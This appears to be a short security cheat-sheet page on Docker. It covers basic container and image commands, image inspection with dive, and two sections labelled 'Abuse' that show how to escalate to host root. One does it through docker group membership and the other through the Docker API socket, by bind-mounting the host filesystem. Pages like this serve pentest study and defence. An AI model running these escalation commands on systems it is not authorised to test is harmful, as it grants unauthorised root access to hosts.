---
title: "Docker"
date: 2024-7-3
tags: ["Forensic", "Docker", "Container", "Dive"]
---

### Basic Commands

```console
# Show all running processes
sudo docker ps -a
```

```console
# Show all images
sudo docker images -a
```

```console
# Stop all processes
sudo docker stop $(sudo docker ps -a -q)
```

```console
# Remove all processes
sudo docker rm -vf $(sudo docker ps -a -q)
```

```console
# Remove all images
sudo docker rmi -f $(sudo docker images -aq)
```

```console
# Shell in docker
sudo docker exec -it <CONTAINER_NAME> sh
```

```console
# Copy file from host to container
sudo docker cp <HOST_FILE_PATH> <CONTAINER_ID>:<CONTAINER_FILE_PATH>
```

```console
# Copy file from container to host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FILE_PATH> <HOST_FILE_PATH>
```

```console
# Copy folder from host to container
sudo docker cp <HOST_FOLDER_PATH>/. <CONTAINER_ID>:<CONTAINER_TARGET_PATH>
```

```console
# Copy folder from container to host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
```

---

### Explore Docker image

{{< tab set1 tab1 active >}}dive{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
dive docker-archive://image.tar
```

<small>*Ref: [dive](https://github.com/wagoodman/dive)*</small>

{{< /tabcontent >}}

---

### Abuse #1: Docker group

```console
# List images
docker images
```

```console
# Mount host root filesystem
docker run -v /:/mnt -it <IMAGE_NAME> bash
```

```console
# Check
ls /mnt/root
```

---

### Abuse #2: Docker API

```console
# Show running containers
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```console
# Create container
curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<IMAGE_NAME>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
```

```console
# Start container
curl -s -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start
```

```console
# Show results
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<CONTAINER_ID>/logs?stderr=1&stdout=1"
```
